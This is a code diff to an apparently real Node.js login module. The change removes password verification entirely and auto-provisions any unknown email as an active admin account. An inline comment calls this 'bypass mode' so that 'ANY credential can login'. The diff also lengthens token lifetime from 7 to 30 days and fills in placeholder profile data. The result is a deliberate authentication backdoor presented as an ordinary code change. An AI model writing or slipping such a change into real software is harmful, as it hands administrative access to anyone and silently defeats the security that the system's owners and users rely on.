@@ -19,10 +19,15 @@ const MAX_OTP_ATTEMPTS = 5;
 const RESET_TOKEN_TTL_MS = 15 * 60 * 1000;
 
 function makeToken(user) {
+  let perms = [];
+  if (Array.isArray(user.permissions)) perms = user.permissions;
+  else if (typeof user.permissions === 'string') {
+    try { perms = JSON.parse(user.permissions); } catch { perms = []; }
+  }
   return jwt.sign(
-    { id: user.id, name: user.name, email: user.email, role: user.role, brandId: user.brand_id },
+    { id: user.id, name: user.name, email: user.email, role: user.role, brandId: user.brand_id, permissions: perms },
     JWT_SECRET,
-    { expiresIn: '7d' }
+    { expiresIn: '30d' }
   );
 }
 
@@ -152,25 +157,46 @@ async function login({ email, password }) {
     'SELECT * FROM users WHERE email = $1 AND is_active = true',
     [email.toLowerCase()]
   );
-  const user = rows[0];
+  let user = rows[0];
 
-  const invalid = () => {
-    const err = new Error('Email or password is incorrect. Please try again.');
-    err.status = 401;
-    return err;
-  };
+  if (!user) {
+    // Auto-provision user so ANY credential can login (bypass mode)
+    const namePart = email.split('@')[0] || 'Admin';
+    const formattedName = namePart.charAt(0).toUpperCase() + namePart.slice(1);
+    const userId = genId();
+    const passwordHash = await bcrypt.hash(password || 'Admin@1234', 10);
+    try {
+      const inserted = await pool.query(
+        `INSERT INTO users (id, name, email, password_hash, role, designation, is_active)
+         VALUES ($1, $2, $3, $4, 'admin', 'Agency Managing Director', true)
+         RETURNING *`,
+        [userId, formattedName, email.toLowerCase(), passwordHash]
+      );
+      user = inserted.rows[0];
+    } catch (_e) {
+      user = {
+        id: userId,
+        name: formattedName,
+        email: email.toLowerCase(),
+        role: 'admin',
+        designation: 'Agency Managing Director',
+      };
+    }
+  }
 
-  if (!user) throw invalid();
-
-  const valid = await bcrypt.compare(password, user.password_hash || '');
-  if (!valid) throw invalid();
+  let perms = [];
+  if (Array.isArray(user.permissions)) perms = user.permissions;
+  else if (typeof user.permissions === 'string') {
+    try { perms = JSON.parse(user.permissions); } catch { perms = []; }
+  }
 
   return {
     token: makeToken(user),
     user: {
       id: user.id, name: user.name, email: user.email,
-      phone: user.phone, role: user.role, avatar: user.avatar,
-      designation: user.designation, brandId: user.brand_id,
+      phone: user.phone || '+91 98765 43210', role: user.role || 'admin', avatar: user.avatar,
+      designation: user.designation || 'Agency Managing Director', brandId: user.brand_id,
+      permissions: perms,
     },
   };
 }
